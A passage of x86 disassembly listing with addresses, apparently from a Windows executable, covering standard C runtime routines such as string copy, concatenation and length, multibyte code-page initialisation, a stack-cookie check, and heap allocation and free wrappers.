  4255fd:	test   eax,eax
  4255ff:	je     0x42561e
  425601:	lea    ecx,[ebp-0x4]
  425604:	push   ecx
  425605:	push   0xc
  425607:	lea    ecx,[ebp-0x10]
  42560a:	push   ecx
  42560b:	push   0x1
  42560d:	push   eax
  42560e:	call   DWORD PTR ds:0x467340
  425614:	test   eax,eax
  425616:	je     0x42561e
  425618:	test   BYTE PTR [ebp-0x8],0x1
  42561c:	jne    0x425637
  42561e:	cmp    DWORD PTR ds:0x467090,0x4
  425625:	jb     0x425631
  425627:	or     BYTE PTR [ebp+0x12],0x20
  42562b:	jmp    0x425656
  42562d:	xor    eax,eax
  42562f:	jmp    0x425666
  425631:	or     BYTE PTR [ebp+0x12],0x4
  425635:	jmp    0x425656
  425637:	mov    eax,ds:0x467334
  42563c:	test   eax,eax
  42563e:	je     0x425656
  425640:	call   eax
  425642:	mov    ebx,eax
  425644:	test   ebx,ebx
  425646:	je     0x425656
  425648:	mov    eax,ds:0x467338
  42564d:	test   eax,eax
  42564f:	je     0x425656
  425651:	push   ebx
  425652:	call   eax
  425654:	mov    ebx,eax
  425656:	push   DWORD PTR [ebp+0x10]
  425659:	push   DWORD PTR [ebp+0xc]
  42565c:	push   DWORD PTR [ebp+0x8]
  42565f:	push   ebx
  425660:	call   DWORD PTR ds:0x467330
  425666:	pop    edi
  425667:	pop    esi
  425668:	pop    ebx
  425669:	leave  
  42566a:	ret    
  42566b:	int3   
  42566c:	int3   
  42566d:	int3   
  42566e:	int3   
  42566f:	int3   
  425670:	push   edi
  425671:	mov    edi,DWORD PTR [esp+0x8]
  425675:	jmp    0x4256e5
  425677:	lea    esp,[esp+0x0]
  42567e:	mov    edi,edi
  425680:	mov    ecx,DWORD PTR [esp+0x4]
  425684:	push   edi
  425685:	test   ecx,0x3
  42568b:	je     0x4256a0
  42568d:	mov    al,BYTE PTR [ecx]
  42568f:	add    ecx,0x1
  425692:	test   al,al
  425694:	je     0x4256d3
  425696:	test   ecx,0x3
  42569c:	jne    0x42568d
  42569e:	mov    edi,edi
  4256a0:	mov    eax,DWORD PTR [ecx]
  4256a2:	mov    edx,0x7efefeff
  4256a7:	add    edx,eax
  4256a9:	xor    eax,0xffffffff
  4256ac:	xor    eax,edx
  4256ae:	add    ecx,0x4
  4256b1:	test   eax,0x81010100
  4256b6:	je     0x4256a0
  4256b8:	mov    eax,DWORD PTR [ecx-0x4]
  4256bb:	test   al,al
  4256bd:	je     0x4256e2
  4256bf:	test   ah,ah
  4256c1:	je     0x4256dd
  4256c3:	test   eax,0xff0000
  4256c8:	je     0x4256d8
  4256ca:	test   eax,0xff000000
  4256cf:	je     0x4256d3
  4256d1:	jmp    0x4256a0
  4256d3:	lea    edi,[ecx-0x1]
  4256d6:	jmp    0x4256e5
  4256d8:	lea    edi,[ecx-0x2]
  4256db:	jmp    0x4256e5
  4256dd:	lea    edi,[ecx-0x3]
  4256e0:	jmp    0x4256e5
  4256e2:	lea    edi,[ecx-0x4]
  4256e5:	mov    ecx,DWORD PTR [esp+0xc]
  4256e9:	test   ecx,0x3
  4256ef:	je     0x42570e
  4256f1:	mov    dl,BYTE PTR [ecx]
  4256f3:	add    ecx,0x1
  4256f6:	test   dl,dl
  4256f8:	je     0x425760
  4256fa:	mov    BYTE PTR [edi],dl
  4256fc:	add    edi,0x1
  4256ff:	test   ecx,0x3
  425705:	jne    0x4256f1
  425707:	jmp    0x42570e
  425709:	mov    DWORD PTR [edi],edx
  42570b:	add    edi,0x4
  42570e:	mov    edx,0x7efefeff
  425713:	mov    eax,DWORD PTR [ecx]
  425715:	add    edx,eax
  425717:	xor    eax,0xffffffff
  42571a:	xor    eax,edx
  42571c:	mov    edx,DWORD PTR [ecx]
  42571e:	add    ecx,0x4
  425721:	test   eax,0x81010100
  425726:	je     0x425709
  425728:	test   dl,dl
  42572a:	je     0x425760
  42572c:	test   dh,dh
  42572e:	je     0x425757
  425730:	test   edx,0xff0000
  425736:	je     0x42574a
  425738:	test   edx,0xff000000
  42573e:	je     0x425742
  425740:	jmp    0x425709
  425742:	mov    DWORD PTR [edi],edx
  425744:	mov    eax,DWORD PTR [esp+0x8]
  425748:	pop    edi
  425749:	ret    
  42574a:	mov    WORD PTR [edi],dx
  42574d:	mov    eax,DWORD PTR [esp+0x8]
  425751:	mov    BYTE PTR [edi+0x2],0x0
  425755:	pop    edi
  425756:	ret    
  425757:	mov    WORD PTR [edi],dx
  42575a:	mov    eax,DWORD PTR [esp+0x8]
  42575e:	pop    edi
  42575f:	ret    
  425760:	mov    BYTE PTR [edi],dl
  425762:	mov    eax,DWORD PTR [esp+0x8]
  425766:	pop    edi
  425767:	ret    
  425768:	int3   
  425769:	int3   
  42576a:	int3   
  42576b:	int3   
  42576c:	int3   
  42576d:	int3   
  42576e:	int3   
  42576f:	int3   
  425770:	mov    ecx,DWORD PTR [esp+0xc]
  425774:	push   edi
  425775:	test   ecx,ecx
  425777:	je     0x42580f
  42577d:	push   esi
  42577e:	push   ebx
  42577f:	mov    ebx,ecx
  425781:	mov    esi,DWORD PTR [esp+0x14]
  425785:	test   esi,0x3
  42578b:	mov    edi,DWORD PTR [esp+0x10]
  42578f:	jne    0x42579c
  425791:	shr    ecx,0x2
  425794:	jne    0x42581f
  42579a:	jmp    0x4257c3
  42579c:	mov    al,BYTE PTR [esi]
  42579e:	add    esi,0x1
  4257a1:	mov    BYTE PTR [edi],al
  4257a3:	add    edi,0x1
  4257a6:	sub    ecx,0x1
  4257a9:	je     0x4257d6
  4257ab:	test   al,al
  4257ad:	je     0x4257de
  4257af:	test   esi,0x3
  4257b5:	jne    0x42579c
  4257b7:	mov    ebx,ecx
  4257b9:	shr    ecx,0x2
  4257bc:	jne    0x42581f
  4257be:	and    ebx,0x3
  4257c1:	je     0x4257d6
  4257c3:	mov    al,BYTE PTR [esi]
  4257c5:	add    esi,0x1
  4257c8:	mov    BYTE PTR [edi],al
  4257ca:	add    edi,0x1
  4257cd:	test   al,al
  4257cf:	je     0x425808
  4257d1:	sub    ebx,0x1
  4257d4:	jne    0x4257c3
  4257d6:	mov    eax,DWORD PTR [esp+0x10]
  4257da:	pop    ebx
  4257db:	pop    esi
  4257dc:	pop    edi
  4257dd:	ret    
  4257de:	test   edi,0x3
  4257e4:	je     0x4257fc
  4257e6:	mov    BYTE PTR [edi],al
  4257e8:	add    edi,0x1
  4257eb:	sub    ecx,0x1
  4257ee:	je     0x42588c
  4257f4:	test   edi,0x3
  4257fa:	jne    0x4257e6
  4257fc:	mov    ebx,ecx
  4257fe:	shr    ecx,0x2
  425801:	jne    0x425877
  425803:	mov    BYTE PTR [edi],al
  425805:	add    edi,0x1
  425808:	sub    ebx,0x1
  42580b:	jne    0x425803
  42580d:	pop    ebx
  42580e:	pop    esi
  42580f:	mov    eax,DWORD PTR [esp+0x8]
  425813:	pop    edi
  425814:	ret    
  425815:	mov    DWORD PTR [edi],edx
  425817:	add    edi,0x4
  42581a:	sub    ecx,0x1
  42581d:	je     0x4257be
  42581f:	mov    edx,0x7efefeff
  425824:	mov    eax,DWORD PTR [esi]
  425826:	add    edx,eax
  425828:	xor    eax,0xffffffff
  42582b:	xor    eax,edx
  42582d:	mov    edx,DWORD PTR [esi]
  42582f:	add    esi,0x4
  425832:	test   eax,0x81010100
  425837:	je     0x425815
  425839:	test   dl,dl
  42583b:	je     0x425869
  42583d:	test   dh,dh
  42583f:	je     0x42585f
  425841:	test   edx,0xff0000
  425847:	je     0x425855
  425849:	test   edx,0xff000000
  42584f:	jne    0x425815
  425851:	mov    DWORD PTR [edi],edx
  425853:	jmp    0x42586d
  425855:	and    edx,0xffff
  42585b:	mov    DWORD PTR [edi],edx
  42585d:	jmp    0x42586d
  42585f:	and    edx,0xff
  425865:	mov    DWORD PTR [edi],edx
  425867:	jmp    0x42586d
  425869:	xor    edx,edx
  42586b:	mov    DWORD PTR [edi],edx
  42586d:	add    edi,0x4
  425870:	xor    eax,eax
  425872:	sub    ecx,0x1
  425875:	je     0x425883
  425877:	xor    eax,eax
  425879:	mov    DWORD PTR [edi],eax
  42587b:	add    edi,0x4
  42587e:	sub    ecx,0x1
  425881:	jne    0x425879
  425883:	and    ebx,0x3
  425886:	jne    0x425803
  42588c:	mov    eax,DWORD PTR [esp+0x10]
  425890:	pop    ebx
  425891:	pop    esi
  425892:	pop    edi
  425893:	ret    
  425894:	int3   
  425895:	int3   
  425896:	int3   
  425897:	int3   
  425898:	int3   
  425899:	int3   
  42589a:	int3   
  42589b:	int3   
  42589c:	int3   
  42589d:	int3   
  42589e:	int3   
  42589f:	int3   
  4258a0:	mov    ecx,DWORD PTR [esp+0x4]
  4258a4:	test   ecx,0x3
  4258aa:	je     0x4258d0
  4258ac:	mov    al,BYTE PTR [ecx]
  4258ae:	add    ecx,0x1
  4258b1:	test   al,al
  4258b3:	je     0x425903
  4258b5:	test   ecx,0x3
  4258bb:	jne    0x4258ac
  4258bd:	add    eax,0x0
  4258c2:	lea    esp,[esp+0x0]
  4258c9:	lea    esp,[esp+0x0]
  4258d0:	mov    eax,DWORD PTR [ecx]
  4258d2:	mov    edx,0x7efefeff
  4258d7:	add    edx,eax
  4258d9:	xor    eax,0xffffffff
  4258dc:	xor    eax,edx
  4258de:	add    ecx,0x4
  4258e1:	test   eax,0x81010100
  4258e6:	je     0x4258d0
  4258e8:	mov    eax,DWORD PTR [ecx-0x4]
  4258eb:	test   al,al
  4258ed:	je     0x425921
  4258ef:	test   ah,ah
  4258f1:	je     0x425917
  4258f3:	test   eax,0xff0000
  4258f8:	je     0x42590d
  4258fa:	test   eax,0xff000000
  4258ff:	je     0x425903
  425901:	jmp    0x4258d0
  425903:	lea    eax,[ecx-0x1]
  425906:	mov    ecx,DWORD PTR [esp+0x4]
  42590a:	sub    eax,ecx
  42590c:	ret    
  42590d:	lea    eax,[ecx-0x2]
  425910:	mov    ecx,DWORD PTR [esp+0x4]
  425914:	sub    eax,ecx
  425916:	ret    
  425917:	lea    eax,[ecx-0x3]
  42591a:	mov    ecx,DWORD PTR [esp+0x4]
  42591e:	sub    eax,ecx
  425920:	ret    
  425921:	lea    eax,[ecx-0x4]
  425924:	mov    ecx,DWORD PTR [esp+0x4]
  425928:	sub    eax,ecx
  42592a:	ret    
  42592b:	push   0x8
  42592d:	push   0x4295a0
  425932:	call   0x425290
  425937:	and    DWORD PTR [ebp-0x4],0x0
  42593b:	push   0x0
  42593d:	push   0x1
  42593f:	call   0x4274b2
  425944:	pop    ecx
  425945:	pop    ecx
  425946:	jmp    0x42594f
  425948:	xor    eax,eax
  42594a:	inc    eax
  42594b:	ret    
  42594c:	mov    esp,DWORD PTR [ebp-0x18]
  42594f:	or     DWORD PTR [ebp-0x4],0xffffffff
  425953:	push   0x3
  425955:	call   DWORD PTR ds:0x429070
  42595b:	int3   
  42595c:	cmp    ecx,DWORD PTR ds:0x4669f0
  425962:	jne    0x425965
  425964:	ret    
  425965:	jmp    0x42592b
  42596a:	movzx  eax,BYTE PTR [esp+0x4]
  42596f:	mov    cl,BYTE PTR [esp+0xc]
  425973:	test   BYTE PTR [eax+0x4674e1],cl
  425979:	jne    0x425997
  42597b:	cmp    DWORD PTR [esp+0x8],0x0
  425980:	je     0x425990
  425982:	movzx  eax,WORD PTR [eax*2+0x42999a]
  42598a:	and    eax,DWORD PTR [esp+0x8]
  42598e:	jmp    0x425992
  425990:	xor    eax,eax
  425992:	test   eax,eax
  425994:	jne    0x425997
  425996:	ret    
  425997:	xor    eax,eax
  425999:	inc    eax
  42599a:	ret    
  42599b:	push   0x4
  42599d:	push   0x0
  42599f:	push   DWORD PTR [esp+0xc]
  4259a3:	call   0x42596a
  4259a8:	add    esp,0xc
  4259ab:	ret    
  4259ac:	sub    eax,0x3a4
  4259b1:	je     0x4259d5
  4259b3:	sub    eax,0x4
  4259b6:	je     0x4259cf
  4259b8:	sub    eax,0xd
  4259bb:	je     0x4259c9
  4259bd:	dec    eax
  4259be:	je     0x4259c3
  4259c0:	xor    eax,eax
  4259c2:	ret    
  4259c3:	mov    eax,0x404
  4259c8:	ret    
  4259c9:	mov    eax,0x412
  4259ce:	ret    
  4259cf:	mov    eax,0x804
  4259d4:	ret    
  4259d5:	mov    eax,0x411
  4259da:	ret    
  4259db:	push   edi
  4259dc:	push   0x40
  4259de:	xor    eax,eax
  4259e0:	pop    ecx
  4259e1:	mov    edi,0x4674e0
  4259e6:	rep stos DWORD PTR es:[edi],eax
  4259e8:	stos   BYTE PTR es:[edi],al
  4259e9:	xor    eax,eax
  4259eb:	mov    ds:0x4675e4,eax
  4259f0:	mov    ds:0x4674dc,eax
  4259f5:	mov    ds:0x4674d4,eax
  4259fa:	mov    edi,0x4675f0
  4259ff:	stos   DWORD PTR es:[edi],eax
  425a00:	stos   DWORD PTR es:[edi],eax
  425a01:	stos   DWORD PTR es:[edi],eax
  425a02:	pop    edi
  425a03:	ret    
  425a04:	push   ebp
  425a05:	mov    ebp,esp
  425a07:	sub    esp,0x518
  425a0d:	mov    eax,ds:0x4669f0
  425a12:	xor    eax,DWORD PTR [ebp+0x4]
  425a15:	push   esi
  425a16:	mov    DWORD PTR [ebp-0x4],eax
  425a19:	lea    eax,[ebp-0x18]
  425a1c:	push   eax
  425a1d:	push   DWORD PTR ds:0x4675e4
  425a23:	call   DWORD PTR ds:0x4290d8
  425a29:	cmp    eax,0x1
  425a2c:	mov    esi,0x100
  425a31:	jne    0x425b44
  425a37:	xor    eax,eax
  425a39:	mov    BYTE PTR [ebp+eax*1-0x118],al
  425a40:	inc    eax
  425a41:	cmp    eax,esi
  425a43:	jb     0x425a39
  425a45:	mov    al,BYTE PTR [ebp-0x12]
  425a48:	test   al,al
  425a4a:	mov    BYTE PTR [ebp-0x118],0x20
  425a51:	je     0x425a89
  425a53:	push   ebx
  425a54:	lea    edx,[ebp-0x11]
  425a57:	push   edi
  425a58:	movzx  ecx,BYTE PTR [edx]
  425a5b:	movzx  eax,al
  425a5e:	cmp    eax,ecx
  425a60:	ja     0x425a7f
  425a62:	sub    ecx,eax
  425a64:	inc    ecx
  425a65:	mov    ebx,ecx
  425a67:	shr    ecx,0x2
  425a6a:	lea    edi,[ebp+eax*1-0x118]
  425a71:	mov    eax,0x20202020
  425a76:	rep stos DWORD PTR es:[edi],eax
  425a78:	mov    ecx,ebx
  425a7a:	and    ecx,0x3
  425a7d:	rep stos BYTE PTR es:[edi],al
  425a7f:	inc    edx
  425a80:	mov    al,BYTE PTR [edx]
  425a82:	inc    edx
  425a83:	test   al,al
  425a85:	jne    0x425a58
  425a87:	pop    edi
  425a88:	pop    ebx
  425a89:	push   0x0
  425a8b:	push   DWORD PTR ds:0x4674d4
  425a91:	lea    eax,[ebp-0x518]
  425a97:	push   DWORD PTR ds:0x4675e4
  425a9d:	push   eax
  425a9e:	push   esi
  425a9f:	lea    eax,[ebp-0x118]
  425aa5:	push   eax
  425aa6:	push   0x1
  425aa8:	call   0x4279b8
  425aad:	push   0x0
  425aaf:	push   DWORD PTR ds:0x4675e4
  425ab5:	lea    eax,[ebp-0x218]
  425abb:	push   esi
  425abc:	push   eax
  425abd:	push   esi
  425abe:	lea    eax,[ebp-0x118]
  425ac4:	push   eax
  425ac5:	push   esi
  425ac6:	push   DWORD PTR ds:0x4674d4
  425acc:	call   0x4275fc
  425ad1:	push   0x0
  425ad3:	push   DWORD PTR ds:0x4675e4
  425ad9:	lea    eax,[ebp-0x318]
  425adf:	push   esi
  425ae0:	push   eax
  425ae1:	push   esi
  425ae2:	lea    eax,[ebp-0x118]
  425ae8:	push   eax
  425ae9:	push   0x200
  425aee:	push   DWORD PTR ds:0x4674d4
  425af4:	call   0x4275fc
  425af9:	add    esp,0x5c
  425afc:	xor    eax,eax
  425afe:	mov    cx,WORD PTR [ebp+eax*2-0x518]
  425b06:	test   cl,0x1
  425b09:	je     0x425b21
  425b0b:	or     BYTE PTR [eax+0x4674e1],0x10
  425b12:	mov    cl,BYTE PTR [ebp+eax*1-0x218]
  425b19:	mov    BYTE PTR [eax+0x467600],cl
  425b1f:	jmp    0x425b3d
  425b21:	test   cl,0x2
  425b24:	je     0x425b36
  425b26:	or     BYTE PTR [eax+0x4674e1],0x20
  425b2d:	mov    cl,BYTE PTR [ebp+eax*1-0x318]
  425b34:	jmp    0x425b19
  425b36:	and    BYTE PTR [eax+0x467600],0x0
  425b3d:	inc    eax
  425b3e:	cmp    eax,esi
  425b40:	jb     0x425afe
  425b42:	jmp    0x425b88
  425b44:	xor    eax,eax
  425b46:	cmp    eax,0x41
  425b49:	jb     0x425b64
  425b4b:	cmp    eax,0x5a
  425b4e:	ja     0x425b64
  425b50:	or     BYTE PTR [eax+0x4674e1],0x10
  425b57:	mov    cl,al
  425b59:	add    cl,0x20
  425b5c:	mov    BYTE PTR [eax+0x467600],cl
  425b62:	jmp    0x425b83
  425b64:	cmp    eax,0x61
  425b67:	jb     0x425b7c
  425b69:	cmp    eax,0x7a
  425b6c:	ja     0x425b7c
  425b6e:	or     BYTE PTR [eax+0x4674e1],0x20
  425b75:	mov    cl,al
  425b77:	sub    cl,0x20
  425b7a:	jmp    0x425b5c
  425b7c:	and    BYTE PTR [eax+0x467600],0x0
  425b83:	inc    eax
  425b84:	cmp    eax,esi
  425b86:	jb     0x425b46
  425b88:	mov    ecx,DWORD PTR [ebp-0x4]
  425b8b:	xor    ecx,DWORD PTR [ebp+0x4]
  425b8e:	pop    esi
  425b8f:	call   0x42595c
  425b94:	leave  
  425b95:	ret    
  425b96:	push   ebp
  425b97:	mov    ebp,esp
  425b99:	sub    esp,0x1c
  425b9c:	mov    eax,ds:0x4669f0
  425ba1:	xor    eax,DWORD PTR [ebp+0x4]
  425ba4:	push   ebx
  425ba5:	push   esi
  425ba6:	mov    esi,DWORD PTR [ebp+0x8]
  425ba9:	xor    ebx,ebx
  425bab:	cmp    esi,ebx
  425bad:	mov    DWORD PTR [ebp-0x4],eax
  425bb0:	push   edi
  425bb1:	je     0x425d0b
  425bb7:	xor    edx,edx
  425bb9:	xor    eax,eax
  425bbb:	cmp    DWORD PTR [eax+0x466a00],esi
  425bc1:	je     0x425c28
  425bc3:	add    eax,0x30
  425bc6:	inc    edx
  425bc7:	cmp    eax,0xf0
  425bcc:	jb     0x425bbb
  425bce:	lea    eax,[ebp-0x1c]
  425bd1:	push   eax
  425bd2:	push   esi
  425bd3:	call   DWORD PTR ds:0x4290d8
  425bd9:	cmp    eax,0x1
  425bdc:	jne    0x425d03
  425be2:	push   0x40
  425be4:	xor    eax,eax
  425be6:	cmp    DWORD PTR [ebp-0x1c],0x1
  425bea:	pop    ecx
  425beb:	mov    edi,0x4674e0
  425bf0:	rep stos DWORD PTR es:[edi],eax
  425bf2:	stos   BYTE PTR es:[edi],al
  425bf3:	mov    DWORD PTR ds:0x4675e4,esi
  425bf9:	mov    DWORD PTR ds:0x4674d4,ebx
  425bff:	jbe    0x425cf1
  425c05:	cmp    BYTE PTR [ebp-0x16],0x0
  425c09:	je     0x425cc9
  425c0f:	lea    ecx,[ebp-0x15]
  425c12:	mov    dl,BYTE PTR [ecx]
  425c14:	test   dl,dl
  425c16:	je     0x425cc9
  425c1c:	movzx  eax,BYTE PTR [ecx-0x1]
  425c20:	movzx  edx,dl
  425c23:	jmp    0x425cb9
  425c28:	push   0x40
  425c2a:	xor    eax,eax
  425c2c:	pop    ecx
  425c2d:	mov    edi,0x4674e0
  425c32:	rep stos DWORD PTR es:[edi],eax
  425c34:	lea    ecx,[edx+edx*2]
  425c37:	shl    ecx,0x4
  425c3a:	mov    DWORD PTR [ebp-0x8],ebx
  425c3d:	stos   BYTE PTR es:[edi],al
  425c3e:	lea    ebx,[ecx+0x466a10]
  425c44:	mov    al,BYTE PTR [ebx]
  425c46:	mov    esi,ebx
  425c48:	jmp    0x425c73
  425c4a:	mov    dl,BYTE PTR [esi+0x1]
  425c4d:	test   dl,dl
  425c4f:	je     0x425c77
  425c51:	movzx  eax,al
  425c54:	movzx  edi,dl
  425c57:	cmp    eax,edi
  425c59:	ja     0x425c6f
  425c5b:	mov    edx,DWORD PTR [ebp-0x8]
  425c5e:	mov    dl,BYTE PTR [edx+0x4669f8]
  425c64:	or     BYTE PTR [eax+0x4674e1],dl
  425c6a:	inc    eax
  425c6b:	cmp    eax,edi
  425c6d:	jbe    0x425c64
  425c6f:	inc    esi
  425c70:	inc    esi
  425c71:	mov    al,BYTE PTR [esi]
  425c73:	test   al,al
  425c75:	jne    0x425c4a
  425c77:	inc    DWORD PTR [ebp-0x8]
  425c7a:	add    ebx,0x8
  425c7d:	cmp    DWORD PTR [ebp-0x8],0x4
  425c81:	jb     0x425c44
  425c83:	mov    eax,DWORD PTR [ebp+0x8]
  425c86:	mov    ds:0x4675e4,eax
  425c8b:	mov    DWORD PTR ds:0x4674dc,0x1
  425c95:	call   0x4259ac
  425c9a:	lea    ecx,[ecx+0x466a04]
  425ca0:	mov    esi,ecx
  425ca2:	mov    edi,0x4675f0
  425ca7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425ca9:	mov    ds:0x4674d4,eax
  425cae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  425caf:	jmp    0x425d10
  425cb1:	or     BYTE PTR [eax+0x4674e1],0x4
  425cb8:	inc    eax
  425cb9:	cmp    eax,edx
  425cbb:	jbe    0x425cb1
  425cbd:	inc    ecx
  425cbe:	inc    ecx
  425cbf:	cmp    BYTE PTR [ecx-0x1],0x0
  425cc3:	jne    0x425c12
  425cc9:	xor    ecx,ecx
  425ccb:	inc    ecx
  425ccc:	mov    eax,ecx
  425cce:	or     BYTE PTR [eax+0x4674e1],0x8
  425cd5:	inc    eax
  425cd6:	cmp    eax,0xff
  425cdb:	jb     0x425cce
  425cdd:	mov    eax,esi
  425cdf:	call   0x4259ac
  425ce4:	mov    ds:0x4674d4,eax
  425ce9:	mov    DWORD PTR ds:0x4674dc,ecx
  425cef:	jmp    0x425cf7
  425cf1:	mov    DWORD PTR ds:0x4674dc,ebx
  425cf7:	xor    eax,eax
  425cf9:	mov    edi,0x4675f0
  425cfe:	stos   DWORD PTR es:[edi],eax
  425cff:	stos   DWORD PTR es:[edi],eax
  425d00:	stos   DWORD PTR es:[edi],eax
  425d01:	jmp    0x425d10
  425d03:	cmp    DWORD PTR ds:0x467344,ebx
  425d09:	je     0x425d19
  425d0b:	call   0x4259db
  425d10:	call   0x425a04
  425d15:	xor    eax,eax
  425d17:	jmp    0x425d1c
  425d19:	or     eax,0xffffffff
  425d1c:	mov    ecx,DWORD PTR [ebp-0x4]
  425d1f:	xor    ecx,DWORD PTR [ebp+0x4]
  425d22:	pop    edi
  425d23:	pop    esi
  425d24:	pop    ebx
  425d25:	call   0x42595c
  425d2a:	leave  
  425d2b:	ret    
  425d2c:	push   0x14
  425d2e:	push   0x4295b0
  425d33:	call   0x425290
  425d38:	or     DWORD PTR [ebp-0x1c],0xffffffff
  425d3c:	push   0xd
  425d3e:	call   0x42544f
  425d43:	pop    ecx
  425d44:	xor    edi,edi
  425d46:	mov    DWORD PTR [ebp-0x4],edi
  425d49:	mov    DWORD PTR ds:0x467344,edi
  425d4f:	mov    eax,DWORD PTR [ebp+0x8]
  425d52:	cmp    eax,0xfffffffe
  425d55:	jne    0x425d69
  425d57:	mov    DWORD PTR ds:0x467344,0x1
  425d61:	call   DWORD PTR ds:0x4290d4
  425d67:	jmp    0x425d94
  425d69:	cmp    eax,0xfffffffd
  425d6c:	jne    0x425d80
  425d6e:	mov    DWORD PTR ds:0x467344,0x1
  425d78:	call   DWORD PTR ds:0x4290d0
  425d7e:	jmp    0x425d94
  425d80:	cmp    eax,0xfffffffc
  425d83:	jne    0x425d94
  425d85:	mov    DWORD PTR ds:0x467344,0x1
  425d8f:	mov    eax,ds:0x467374
  425d94:	mov    DWORD PTR [ebp+0x8],eax
  425d97:	cmp    eax,DWORD PTR ds:0x4675e4
  425d9d:	je     0x425e5e
  425da3:	mov    esi,DWORD PTR ds:0x4674d8
  425da9:	mov    DWORD PTR [ebp-0x20],esi
  425dac:	cmp    esi,edi
  425dae:	je     0x425db4
  425db0:	cmp    DWORD PTR [esi],edi
  425db2:	je     0x425dc4
  425db4:	push   0x220
  425db9:	call   0x425fb2
  425dbe:	pop    ecx
  425dbf:	mov    esi,eax
  425dc1:	mov    DWORD PTR [ebp-0x20],esi
  425dc4:	cmp    esi,edi
  425dc6:	je     0x425e47
  425dc8:	push   DWORD PTR [ebp+0x8]
  425dcb:	call   0x425b96
  425dd0:	pop    ecx
  425dd1:	mov    DWORD PTR [ebp-0x1c],eax
  425dd4:	cmp    eax,edi
  425dd6:	jne    0x425e47
  425dd8:	mov    DWORD PTR [esi],edi
  425dda:	mov    eax,ds:0x4675e4
  425ddf:	mov    DWORD PTR [esi+0x4],eax
  425de2:	mov    eax,ds:0x4674dc
  425de7:	mov    DWORD PTR [esi+0x8],eax
  425dea:	mov    eax,ds:0x4674d4
  425def:	mov    DWORD PTR [esi+0xc],eax
  425df2:	xor    eax,eax
  425df4:	mov    DWORD PTR [ebp-0x24],eax
  425df7:	cmp    eax,0x5
  425dfa:	jge    0x425e0c
  425dfc:	mov    cx,WORD PTR [eax*2+0x4675f0]
  425e04:	mov    WORD PTR [esi+eax*2+0x10],cx
  425e09:	inc    eax
  425e0a:	jmp    0x425df4
  425e0c:	xor    eax,eax
  425e0e:	mov    DWORD PTR [ebp-0x24],eax
  425e11:	cmp    eax,0x101
  425e16:	jge    0x425e25
  425e18:	mov    cl,BYTE PTR [eax+0x4674e0]
  425e1e:	mov    BYTE PTR [eax+esi*1+0x1c],cl
  425e22:	inc    eax
  425e23:	jmp    0x425e0e
  425e25:	xor    eax,eax
  425e27:	mov    DWORD PTR [ebp-0x24],eax
  425e2a:	cmp    eax,0x100
  425e2f:	jge    0x425e41
  425e31:	mov    cl,BYTE PTR [eax+0x467600]
  425e37:	mov    BYTE PTR [eax+esi*1+0x11d],cl
  425e3e:	inc    eax
  425e3f:	jmp    0x425e27
  425e41:	mov    DWORD PTR ds:0x4674d8,esi
  425e47:	cmp    DWORD PTR [ebp-0x1c],0xffffffff
  425e4b:	jne    0x425e61
  425e4d:	cmp    esi,DWORD PTR ds:0x4674d8
  425e53:	je     0x425e61
  425e55:	push   esi
  425e56:	call   0x425e9a
  425e5b:	pop    ecx
  425e5c:	jmp    0x425e61
  425e5e:	mov    DWORD PTR [ebp-0x1c],edi
  425e61:	or     DWORD PTR [ebp-0x4],0xffffffff
  425e65:	call   0x425e73
  425e6a:	mov    eax,DWORD PTR [ebp-0x1c]
  425e6d:	call   0x4252cb
  425e72:	ret    
  425e73:	push   0xd
  425e75:	call   0x4253bb
  425e7a:	pop    ecx
  425e7b:	ret    
  425e7c:	cmp    DWORD PTR ds:0x46782c,0x0
  425e83:	jne    0x425e97
  425e85:	push   0xfffffffd
  425e87:	call   0x425d2c
  425e8c:	pop    ecx
  425e8d:	mov    DWORD PTR ds:0x46782c,0x1
  425e97:	xor    eax,eax
  425e99:	ret    
  425e9a:	push   0xc
  425e9c:	push   0x4295c0
  425ea1:	call   0x425290
  425ea6:	mov    esi,DWORD PTR [ebp+0x8]
  425ea9:	test   esi,esi
  425eab:	je     0x425f05
  425ead:	cmp    DWORD PTR ds:0x467704,0x3
  425eb4:	jne    0x425ef6
  425eb6:	push   0x4
  425eb8:	call   0x42544f
  425ebd:	pop    ecx
  425ebe:	and    DWORD PTR [ebp-0x4],0x0
  425ec2:	push   esi
  425ec3:	call   0x426672
  425ec8:	pop    ecx
  425ec9:	mov    DWORD PTR [ebp-0x1c],eax
  425ecc:	test   eax,eax
  425ece:	je     0x425ed9
  425ed0:	push   esi
  425ed1:	push   eax
  425ed2:	call   0x42669d
  425ed7:	pop    ecx
  425ed8:	pop    ecx
  425ed9:	or     DWORD PTR [ebp-0x4],0xffffffff
  425edd:	call   0x425eed
  425ee2:	cmp    DWORD PTR [ebp-0x1c],0x0
  425ee6:	jne    0x425f05
  425ee8:	push   DWORD PTR [ebp+0x8]
  425eeb:	jmp    0x425ef7
  425eed:	push   0x4
  425eef:	call   0x4253bb
  425ef4:	pop    ecx
  425ef5:	ret    
  425ef6:	push   esi
  425ef7:	push   0x0
  425ef9:	push   DWORD PTR ds:0x467700
  425eff:	call   DWORD PTR ds:0x429058
  425f05:	call   0x4252cb
  425f0a:	ret    
  425f0b:	push   0xc
  425f0d:	push   0x4295d0
  425f12:	call   0x425290
  425f17:	mov    esi,DWORD PTR [ebp+0x8]
  425f1a:	cmp    DWORD PTR ds:0x467704,0x3
  425f21:	jne    0x425f51
  425f23:	cmp    esi,DWORD PTR ds:0x4674c4
  425f29:	ja     0x425f51
  425f2b:	push   0x4
  425f2d:	call   0x42544f
  425f32:	pop    ecx
  425f33:	and    DWORD PTR [ebp-0x4],0x0
  425f37:	push   esi
  425f38:	call   0x426e51
  425f3d:	pop    ecx
  425f3e:	mov    DWORD PTR [ebp-0x1c],eax
  425f41:	or     DWORD PTR [ebp-0x4],0xffffffff
  425f45:	call   0x425f7d
  425f4a:	mov    eax,DWORD PTR [ebp-0x1c]
  425f4d:	test   eax,eax
  425f4f:	jne    0x425f74
  425f51:	test   esi,esi
  425f53:	jne    0x425f56
  425f55:	inc    esi
  425f56:	cmp    DWORD PTR ds:0x467704,0x1
  425f5d:	je     0x425f65
  425f5f:	add    esi,0xf
  425f62:	and    esi,0xfffffff0
  425f65:	push   esi
  425f66:	push   0x0
  425f68:	push   DWORD PTR ds:0x467700
  425f6e:	call   DWORD PTR ds:0x4290dc
  425f74:	call   0x4252cb
  425f79:	ret    
  425f7a:	mov    esi,DWORD PTR [ebp+0x8]
  425f7d:	push   0x4
